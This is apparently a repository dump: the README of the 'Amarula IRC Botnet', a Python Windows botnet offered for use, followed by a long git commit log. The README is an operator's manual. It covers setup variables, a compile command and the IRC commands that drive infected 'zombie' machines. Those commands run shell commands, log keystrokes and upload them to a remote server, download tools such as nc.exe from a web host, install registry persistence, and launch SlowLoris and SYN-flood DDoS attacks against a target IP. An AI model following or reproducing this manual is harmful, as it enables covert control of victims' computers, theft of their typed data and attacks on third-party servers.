@@ -1,0 +1,804 @@
+======================: FILES :======================
+======================: README CONTENT :======================
+# Amarula IRC Botnet v2.1
+<h4> Panama Version </h4>
+
+
+Botnet client feito em **Python 2.7** *(written in Python 2.7)* <br>
+Testado em: **Windows XP, 8, 10**, *(tested on)*<br>
+Escrito por: **Carlos Néri Correia** *(coded by)* <br>
+Versão: **2.1** *(version)*
+
+## Como funciona? *(how it works)*
+O Amarula IRC Botnet é um *botnet client* codado em Python 2.7. O malware nada mais é do que um cliente IRC, especialmente construído, que se conecta a um server IRC e entra em um canal como se fosse um usuario comum.
+O Administrador, por sua vez, também estará conectado ao canal, mas através de um programa de cliente IRC normal (como o Hexchat), de forma que, toda vez que o Adm envia uma mensagem para o canal, o BOT interpreta essa mensagem como um comando a ser executado no sistema. São diversas as vantagens de administrar os BOTs através do IRC - Os servers são ativos 24h, não é necessário abrir portas no PC, o IRC é um protocolo teoricamente confiável, entre outras.
+
+## Funções *(features)*
+- Executar comandos shell *(shell command execution)* <br>
+- Keylogger - Captura de teclas digitadas pelo cliente em tempo real *(real-time keylogging)* <br>
+- Listar diretório atual do bot *(list current working directory)* <br>
+- Listar todos os arquivos de um *diretorio (list all directory files)* <br>
+- Obter ip local e externo do bot *(get local and WAN bot IP)* <br>
+- Download de arquivos da web via HTTP *(HTTP web downloading)* <br>
+- Upload de arquivos para servidor web via HTTP *(upload bot files to web server)* <br>
+- Envio de logs para servidor remoto *(send logs to remote server)* <br>
+- Deletar arquivos no BOT *(delete files)* <br>
+- Executar arquivos no BOT *(run files)*<br>
+- Persistência *(persistence)*<br>
+- Ataques DDoS na camada 7 *(layer 7 DDoS attacks)*<br>
+- Ataques DDoS na camada 4 *(layer 4 DDoS attacks)*<br>
+
+## Instalação *(install)*
+Faça o download do ZIP ou clone o repositório:
+    
+	$ git clone https://github.com/hackerama/Amarula-Python-Botnet.git
+
+Algumas bibliotecas do python são requeridas:   
+    
+	$ pip install requests
+	$ pip install pypiwin32
+
+A biblioteca pyHook, também é exigida. abaixo o link para baixar o executável de instalação.
+
+**Download pyHook**
+https://sourceforge.net/projects/pyhook/
+
+## Configuração *(setup)*
+Algumas variáveis precisarão ser definidas ou alteradas, para que a conexão do BOT com o IRC seja feita corretamente. <br>
+Toda a administração dos BOTs será feita através de um cliente IRC. O Administrador enviará comandos para o canal onde os BOTs estarão conectados e intrepretarão as mensagens enviadas como comandos. 
+
+***VARIÁVEIS:*** *(variables)* <br>
+![Screenshot](https://preview.ibb.co/j7QStm/variables.png)
+
+***ircServer*** *(sets IRC server address)* <br>
+Endereço do servidor IRC ao qual o BOT irá se conectar. <br>
+
+***ircPwdCha*** *(sets IRC channel password)*<br>
+Define o password do canal IRC ao qual o bot irá se conectar. <br>
+Caso o canal não possua password, deixar em branco ("") <br>
+Importante setar um password no canal para que outras pessoas não entrem e possam controlar os seus bots.
+
+***ircChanne*** *(sets IRC channel)* <br>
+Canal do IRC ao qual o bot irá se conectar. <br>
+É interpretando as mensagens enviadas para o canal que o BOT irá executar os comandos internamente no cliente.
+
+***botPass*** *(sets password to activate and connect to the BOTS)* <br>
+Define um passoword para ativar, conectar e controlar os bots no canal <br>
+ 
+***botAdmi*** *(Admin Name - NOT OBLIGATORY)* <br>
+Define um nome pelo qual os zumbis te chamarão <br>
+Não é obrigatório. <br>
+
+***urlUpload*** *(Upload page on remote server)* <br>
+Página de upload no servidor remoto, para a função de envio remoto. <br>
+Será criado um arquivo *capt-(nome do PC).txt* na mesma pasta de upload.php, no servidor.  
+
+***ldir*** *(sets local directory, dropping directory)* <br>
+Diretório local, onde será salvo o arquivo de log. <br>
+Diretório para o qual o .exe se copia para ser executado em persistência quando a máquina reiniciar.
+
+
+
+## Compilar *(compile)*
+
+	$ pyinstaller -w amarula.py --onefile
+    
+## Controlando os bots *(usage)*
+
+![Screenshot](https://preview.ibb.co/kwPyzR/help.png)
+
+- [login] para se conectar aos BOTS no canal <br>
+  A senha padrão é "raise".
+  
+		$ USAGE: login <senha> br>
+		$ Ex: login raise
+		
+- [help] para listar os comandos disponíveis <br>
+		
+		$ USAGE: help <botnick> <br>
+		$ Ex: help DESKTOP-PC-3456
+
+- [dir] para vizualizar o diretorio atual do zumbi <br>
+		
+		$ USAGE: ls <botnick> <br>
+		$ Ex: ls DESKTOP-PC-3456
+
+- [ls] para listar o conteudo da pasta atual <br>
+		
+		$ USAGE: ls <botnick> <br>
+		$ Ex: ls DESKTOP-PC-3456
+
+- [ip] para mostrar os ips do bot
+		
+		$ USAGE: ls <botnick> 
+		$ Ex: ip DESKTOP-PC-3456
+	
+- [upload] para fazer upload de arquivos do bot
+  Será feito o upload para o servidor web definido na variável urlUpload 
+		
+		$ USAGE: $ USAGE: upload <Arquivo> <botnick>
+		$ Ex: upload leak.txt DESKTOP-PC-3456
+
+- [download] para baixar arquivos da web para o zumbi
+		
+		$ USAGE: $ USAGE: download <link> <botnick>
+		$ Ex: download http://seusite.com/nc.exe DESKTOP-PC-3456
+
+- [run] para executar um programa ou arquivo
+
+		$ USAGE:  run <programa> <botnick>
+		$ Ex: run calc.exe DESKTOP-PC-3456
+
+- [delete] para excluir arquivos
+		
+		$ USAGE: delete <arquivo> <botnick>
+		$ Ex: delete leak.txt DESKTOP-PC-3456
+
+- [keylog start] para ativar o keylogger <br>
+  O arquivo de log será upado para o servidor web a cada 100 caracteres digitados. <br>
+  Será iniciado um novo processo no sistema do BOT para o keylogger.		
+
+		$ USAGE: keylog start <botnick>
+		$ Ex: keylog start DESKTOP-PC-3456
+		$ Ex: keylog start wave 
+
+
+- [keylog stop] para desativar o keylogger
+		
+		$ USAGE: keylog stop <botnick>
+		$ Ex: keylog stop DESKTOP-PC-3456
+		$ Ex: keylog stop wave
+		
+
+- [slow start] para ativar o ataque SlowLoris <br>
+  Ataque DDoS à camada 7 de servidores web com o SlowLoris.
+		
+		$ USAGE: slow start <socket count> <ip> <port> [<botnick> || <wave>]
+		$ Ex: slow start 700 206.285.1.23 80 DESKTOP-PC-3456
+		$ Ex: slow start 700 206.285.1.23 80 wave
+
+- [slow stop] para desativar o SlowLoris
+		
+		$ USAGE: slow stop <botnick> || wave
+		$ Ex: slow stop DESKTOP-PC-3456
+		$ Ex: slow stop wave
+
+- [plum start] para ativar o ataque Syn Flood <br>
+  Ataque DDoS à camada 4 de servidores com o Plum.
+		
+		$ USAGE: plum start <threads> <ip> <port> [<botnick> || <wave>]
+		$ Ex: plum start 10 206.285.1.23 80 DESKTOP-PC-3456
+		$ Ex: plum start 10 206.285.1.23 80 wave
+
+- [plum stop] para desativar o Syn Flood
+		
+		$ USAGE: plum stop <botnick> || wave
+		$ Ex: plum stop DESKTOP-PC-3456
+		$ Ex: plum stop wave
+
+
+- [persistence]   para instalar persistencia no registro do Windows
+  Instala a persistencia, iniciando o bot toda vez que o PC do cliente iniciar <br>
+		
+		$ USAGE: persistence <botnick>
+		$ Ex: persistence DESKTOP-PC-3456
+
+- [shell] para executar comandos no terminal.
+		
+		$ USAGE: shell <comando> <botnick>
+		$ Ex: shell echo HACKED hack.txt && DIR hack.txt DESKTOP-PC-3456
+		
+- [sair] para que os bots ativos saiam do canal <br>
+
+		$ USAGE: sair		
+		
+- [sair] matar todos os BOTs ativos <br>
+  Todos os zumbis ativos desconectam-se do IRC
+		
+		$ USAGE: matar		
+## Demonstração *(demo)*
+
+https://youtu.be/yYqAwiaAgrA
+====================== GIT HISTORY: ======================
+ca8a422 HEAD@{0}: clone: from https://github.com/hackerama/Amarula-Python-Botnet
+commit ca8a422022a40b036e5ab7f07e3fab4d21c1bcf6
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Tue Mar 5 14:13:23 2019 -0300
+
+    delete
+
+commit af051d85dc44706de22bca25e022b52ade3a09a8
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Tue Mar 5 14:06:43 2019 -0300
+
+    test
+
+commit 1069260e77ea95f13efaf869b070493f43561850
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Nov 21 23:59:41 2018 -0200
+
+    Cheesebread Version
+
+commit a61768485bbe3d7368f6fdaf729763308679e9c7
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Nov 21 23:33:06 2018 -0200
+
+    Cheesebread Version
+
+commit 0f6e6d69660b56e4277e960f2cebf8f06b9454f9
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Nov 21 23:26:22 2018 -0200
+
+    Panama Version
+
+commit ad3f4032180f3bb3c3a4154a18fb706d3277f350
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Nov 21 23:23:47 2018 -0200
+
+    Panama Version
+
+commit 557cca3480af9a3c82f8d484f36da6769bf40cea
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Sep 26 10:50:55 2018 -0500
+
+    update
+
+commit 8b235300e0519e04279f7f4deb6d93031ad259c2
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Sun Sep 16 21:31:53 2018 -0300
+
+    Previous Versions
+
+commit b745addbcd6dcb1d03a79a0c56eb43f899a8b254
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Sun Sep 16 21:30:39 2018 -0300
+
+    Amarula IRC Botnet v2.1 Panama Version
+
+commit 51c3197b1085d61e1e44ac0db76b8e81d3be2e96
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Sun Sep 16 21:27:19 2018 -0300
+
+    Amarula IRC Botnet - README
+    
+    Panama Version Manual
+
+commit c5c1cd503b2528c6b5818a9ce46cf5a87676560d
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Sun Sep 16 21:24:55 2018 -0300
+
+    Amarula IRC Botnet v2.1 - README
+    
+    Panama Version Manual
+
+commit e11b16b1d912ba22cacd9c6355a9bf8e4678bb43
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Sun Sep 16 21:22:27 2018 -0300
+
+    Amarula Python Botnet v2.1 - README
+    
+    Panama Version
+
+commit bd6c6aaa6198d215ab46445eaf47e2eb8e6de065
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Sun Sep 16 21:00:19 2018 -0300
+
+    delete
+
+commit de579e83af49b2c88736f2ee01ced5d7005543c7
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Sun Sep 16 21:00:04 2018 -0300
+
+    delete
+
+commit 63d8da6e1fb278f2e372a34a6b6535f1d8ace8d9
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Sun Sep 16 20:03:48 2018 -0300
+
+    Panama Version
+
+commit 2f62e565d3eafa636939d2c6b42e73710847eaed
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Sep 12 22:23:23 2018 -0300
+
+    README.MD 1.0 VERSION
+
+commit a33a6a3e1197b73b139f783936fbc12983e5c138
+Author: root <root@DESKTOP-G6GNV9F.localdomain>
+Date:   Sat Sep 8 20:23:20 2018 +0000
+
+    Previous versions
+
+commit bf83f5ad9086635e4f9bc2d6df68cb7f6c81812e
+Author: root <root@DESKTOP-G6GNV9F.localdomain>
+Date:   Sat Sep 8 20:14:27 2018 +0000
+
+    upload
+
+commit fb2e22093b0ab8de5033558daeaf5525f8a35005
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Mon Sep 3 19:23:38 2018 -0300
+
+    Panama Version
+
+commit c21f785bcfb8387827522d88cf9f9e2e9a82fd17
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Thu Mar 8 19:14:52 2018 -0300
+
+    plum version
+
+commit e194fa81ac3b8f6caa9de7a7355fd709d1e04fac
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Thu Mar 8 18:22:27 2018 -0300
+
+    useraglist
+
+commit b9a4c81dba77f67d5ac28dc87fa11459b5dadc23
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Thu Mar 8 17:34:32 2018 -0300
+
+    plum version
+
+commit 3695a87d5e2c33eaa4292a5f309dd5f890050d15
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Thu Mar 8 14:50:51 2018 -0300
+
+    plum version
+
+commit ee940bbbb1154275aad4ec91d19ee65391a6a97a
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Mar 7 00:32:18 2018 -0300
+
+    Plum version
+
+commit 3daef58f968af9a747e12aad5b684144d926019c
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Mon Mar 5 23:18:29 2018 -0300
+
+    Plum Version
+
+commit cb75cab91b1691243d88e07116797b685146b6e6
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 23:22:01 2018 -0200
+
+    Amarula IRC Botnet v1.0 (Abacatch Version)
+
+commit 036db3c46aef2a0020754ca77d3910caddbfc9d6
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 23:14:36 2018 -0200
+
+    Amarula IRC Botnet v1.0 (Abacatch Version)
+
+commit 79f32476e9258c80ad9ebc9a86181d94c0b939c6
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 21:41:30 2018 -0200
+
+    Amarula IRC Botnet v1.0 (Abacatch Version)
+
+commit bc62841abd1f4541124417ba2b80deb17b1c1b54
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 20:51:44 2018 -0200
+
+    Amarula IRC Botnet v1.0 (Abacatch Version)
+
+commit 51e528bf463aca9b31810c3329e73600f8638209
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 20:36:30 2018 -0200
+
+    Amarula IRC Botnet v1.0 - Abacatch Version
+
+commit e75ad3b63b845729dfe81615960431841567845a
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 20:35:16 2018 -0200
+
+    Amarula IRC Botnet v1.0 - Abacatch Version
+
+commit 046885c43ed1f9c651fdf3700b6c814e4b47c88e
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 20:34:27 2018 -0200
+
+    Amarula IRC Botnet v1.0 - Abacatach Version
+
+commit adb51ad8fbc54b12cb670a3a7c600d393c0ce829
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 20:31:13 2018 -0200
+
+    Amarula IRC Botnet v1.0 - Abacatch Version
+
+commit e76ad42bdb4231ed582416141378f751889d8eca
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 20:27:07 2018 -0200
+
+    Pendrive Dropper (nao obrigatorio)
+
+commit 7dd831bc474e9ec12dce5762410af353f4ff0a10
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 20:22:20 2018 -0200
+
+    Array PHP que trata os uploads no web server
+
+commit be0b9d4c500c7274adec57d40128cf88350a601e
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 20:20:15 2018 -0200
+
+    delete
+
+commit 8a57b8e2d9cf4d16d57740c16bfc7750ba920a29
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 20:18:33 2018 -0200
+
+    delete
+
+commit 555cf2889be82fa1286bb1079eccb5fc40ee46ed
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 18:22:50 2018 -0200
+
+    Amarula IRC Botnet v1.0 (Abacatach Version)
+
+commit bf89c39d82d36bc7afa3b60a1a0b0db7e6f4326d
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 18:19:04 2018 -0200
+
+    update
+
+commit e1dc386bcabdfb7dfaa7cf70af17b1731e6a43c3
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 18:17:16 2018 -0200
+
+    update
+
+commit 470a95abb51354937d5080c3ab38f866d5b96e51
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 18:16:09 2018 -0200
+
+    update
+
+commit f07ebd3bae188a6e8d6eec96e08c174913b1e001
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 18:15:03 2018 -0200
+
+    update
+
+commit 0aee57d62b9c58efdf67293ed64d4f1496abd2a5
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 18:10:08 2018 -0200
+
+    update
+
+commit ec5df4e76a25c80d5dcfd67244f330ed2ac62d00
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 17:48:30 2018 -0200
+
+    update
+
+commit 55f86a7c42a5333e2ef7b5e7c4f6a79b2c9a08f0
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 17:46:32 2018 -0200
+
+    update
+
+commit fbfb3e0380510fcb53240bdadf3cb5b352ee1cfc
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 17:44:04 2018 -0200
+
+    update
+
+commit c72e67724737f2a77f04be6c7de1992b6fa59c41
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 17:41:17 2018 -0200
+
+    update
+
+commit 0fd68b62e87d3afc994ad5443df923f56c2814c7
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 17:39:20 2018 -0200
+
+    update
+
+commit bdd68955a8de26b7561f310d6188137adf7e08f5
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 17:37:35 2018 -0200
+
+    update
+
+commit 9067121cdcb1b453d157807ebb7c77ad84be6bb3
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 17:33:19 2018 -0200
+
+    update
+
+commit 6f12362d90501de06176c79155b5675042fde770
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 17:04:59 2018 -0200
+
+    update
+
+commit 91a10fdd6c2d01dbc715dabcb40f54df64b281d7
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 17:04:09 2018 -0200
+
+    update
+
+commit b38bdd6a01caa1c04300faae0568fd9e035624dc
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 17:02:50 2018 -0200
+
+    update
+
+commit e900e2a3a2e48b4f27422d287dfe0866339883c0
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 17:02:13 2018 -0200
+
+    update
+
+commit 72f6b1110c7cf29f20b3675cb4481599dd3a6306
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 16:58:07 2018 -0200
+
+    update
+
+commit f20cf9b4f1ff7a4e8c8769169bbec4d298713b6d
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 16:56:08 2018 -0200
+
+    update
+
+commit f329283edb86f5c7e9dfd04268d3526a7918c2e3
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 16:38:29 2018 -0200
+
+    update
+
+commit 8624401e04f626b8a311e5cc535635a9a79ff5be
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 16:07:29 2018 -0200
+
+    update
+
+commit 2dda249af0e7aeea4a85f70e878c8915e509652b
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 15:57:09 2018 -0200
+
+    update
+
+commit e508e3a70b46dcc939cff6cac589fc237a394aee
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 15:42:29 2018 -0200
+
+    update
+
+commit 15af0c12848ba29265662a8fdd5f502eac529b94
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 15:42:23 2018 -0200
+
+    update
+
+commit c1633ccb1e3dc19505b3956a5c278fa2db369aad
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 15:40:14 2018 -0200
+
+    update
+
+commit e92aab78feff0d1c4ec9ec1f174e1888bfb52e06
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 15:40:08 2018 -0200
+
+    update
+
+commit e91f08998576c8dbdda1ec9a07606ef1ca96fdd2
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 15:11:18 2018 -0200
+
+    update
+
+commit 95c147b1d6e2268f35a90da1e8bdc39d7147ca77
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 15:07:34 2018 -0200
+
+    update
+
+commit 939d2f9011b07ee8316a20f8ce681dda7cf84ff3
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 15:04:11 2018 -0200
+
+    update
+
+commit b0273938e0f2c55d3b3a1ead4ee9b8b268d2bbb1
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 15:04:04 2018 -0200
+
+    update
+
+commit e607bb53dbc6f12d74f65359d1d089a71010ab00
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 15:02:56 2018 -0200
+
+    UPDATE
+
+commit d23e214d0c290c8e7d27107ac834340530145506
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 14:59:05 2018 -0200
+
+    UPDATE
+
+commit 45efeb8cc880e07aa7ba3c8de4eeea535b4a9340
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 14:51:52 2018 -0200
+
+    update
+
+commit ca27c112440e2a52dac58272191b0d4f95b7f00b
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 14:36:59 2018 -0200
+
+    update
+
+commit 6bf5a68298d5f93f568b79580618fb464698fcdc
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 14:36:21 2018 -0200
+
+    update
+
+commit 7d00f4784df4156a2cabc5a629234b9e89a64d45
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 14:12:42 2018 -0200
+
+    update
+
+commit 3b9d5707534bb05aa15b249c8aedf57768ee829e
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 14:00:42 2018 -0200
+
+    update
+
+commit 39a7a586e0961ea3e9f7dbbb30df103b4410d7db
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 13:53:11 2018 -0200
+
+    Amarula IRC Botnet v1.0 - Abacatch Version
+
+commit 516f92acb3846157fc9577862328e09dc5afd9a5
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 13:52:11 2018 -0200
+
+    Amarula IRC Botnet v1.0 - Abacatch Version
+
+commit 98ab845afdffc70a3bd3d08747942aad28b39ecc
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 02:55:25 2018 -0200
+
+    update
+
+commit 7b05f940a1932fd1d8452c33c928d09f21f987c3
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 02:55:08 2018 -0200
+
+    update
+
+commit b6a339bac89411d380856126805271f257cc8683
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 01:37:16 2018 -0200
+
+    update
+
+commit fbc26f28043d444c6d36ec8ae5844c77963c26e7
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 01:37:01 2018 -0200
+
+    update
+
+commit fc5ac0f76aede2238d28abff3a8357f787992a64
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jan 31 01:31:05 2018 -0200
+
+    update
+
+commit 24a3a86d4549111ee1738200b0ed53fa3287bb98
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Tue Jan 30 01:22:19 2018 -0200
+
+    update
+
+commit 8c039754a7434f0c473bdd3e9e8fac016a6f3fe2
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Tue Jan 30 00:51:47 2018 -0200
+
+    update
+
+commit 7b049b701808c6bd2cae8b0ff5e72faf50116f44
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Tue Jan 30 00:24:16 2018 -0200
+
+    update
+
+commit 71895c6326123fff2fadcfe531fa54f4f1f824fc
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Tue Jan 30 00:21:21 2018 -0200
+
+    UPDATE
+    
+    SSSSSD
+
+commit 5906b7fe4342aa7da14f4f9424a58790f36d24b0
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Tue Jan 30 00:20:11 2018 -0200
+
+    UPDATE
+
+commit 3baec0273b70978bc4a3b14c9c014e3be0a4bf78
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Mon Jan 29 23:28:56 2018 -0200
+
+    update
+
+commit f3f1b6b6b935a69b1349d171ed78baaba3585b3a
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Mon Aug 21 21:33:33 2017 -0300
+
+    Delete botnet7.py
+
+commit ba98137a2f6c344586d356371c9ec28cc33c13aa
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Mon Aug 21 21:30:04 2017 -0300
+
+    Irc Client
+
+commit 8bafa6976abbc7ca3ffb366c784a782dcdecc866
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Mon Aug 21 21:29:37 2017 -0300
+
+    Client Python
+
+commit cf1b35cddc6f9c1dff3032af4a5fd342d8afae01
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Mon Aug 21 21:19:43 2017 -0300
+
+    Pendrive Dropper
+
+commit 2f8832a911c2b07d3607b3a7ec423686daf757b8
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Mon Aug 21 21:04:13 2017 -0300
+
+    Arquivo exe compilado
+
+commit 56362fa0968eb34693df2aed85f3f6e8a305e710
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Mon Aug 21 20:56:15 2017 -0300
+
+    Python BotNet
+
+commit 7dd6894529e48496fbe478de714e1ceda6e04434
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Sun Jul 2 19:36:01 2017 -0300
+
+    update
+
+commit e2cf2ca780e9d3c11998a6217898b68f2dc2edc3
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Sun Jul 2 19:34:28 2017 -0300
+
+    update
+
+commit d85e2563149c3a5afb3f64557f8f4940e76d8aef
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Sun Jul 2 15:00:21 2017 -0300
+
+    update
+
+commit d42aba9704117aa140db1da43cbc2002b383a932
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Mon Jun 26 19:45:51 2017 -0300
+
+    update
+
+commit 80d8134e99992967867076d134ad6f8ea3bfa043
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Wed Jun 14 01:05:01 2017 +0100
+
+    bot
+
+commit 6cf41325dadf11dc98096b0cf67a394d27067b31
+Author: Hacker4ma <hackerama@protonmail.com>
+Date:   Tue Jun 13 21:03:39 2017 -0300
+
+    Initial commit
